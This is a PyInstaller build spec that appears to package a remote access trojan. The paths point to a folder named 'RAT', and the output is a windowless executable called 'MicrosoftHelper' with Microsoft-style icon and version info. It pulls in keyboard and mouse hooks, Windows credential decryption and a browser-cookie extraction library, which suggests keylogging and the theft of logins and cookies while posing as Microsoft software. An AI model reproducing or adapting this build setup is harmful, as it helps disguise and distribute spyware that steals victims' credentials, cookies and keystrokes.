# -*- mode: python ; coding: utf-8 -*-
from PyInstaller.utils.hooks import collect_submodules

hiddenimports = ['win32timezone', 'win32crypt', 'pynput.keyboard._win32', 'pynput.mouse._win32']
hiddenimports += collect_submodules('comtypes')
hiddenimports += collect_submodules('pycaw')
hiddenimports += collect_submodules('browser_cookie3')


a = Analysis(
    ['main.py'],
    pathex=[],
    binaries=[],
    datas=[('webui', 'webui'), ('bin', 'bin')],
    hiddenimports=hiddenimports,
    hookspath=[],
    hooksconfig={},
    runtime_hooks=[],
    excludes=['matplotlib', 'tkinter', 'PyQt5', 'PySide2'],
    noarchive=False,
    optimize=0,
)
pyz = PYZ(a.pure)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.datas,
    [],
    name='MicrosoftHelper',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=False,
    upx_exclude=[],
    runtime_tmpdir=None,
    console=False,
    disable_windowed_traceback=False,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
    version='C:/Users/Tech Line/OneDrive/Documents/RAT/version_info.txt',
    icon=['C:/Users/Tech Line/OneDrive/Documents/RAT/MicrosoftHelper.ico'],
)
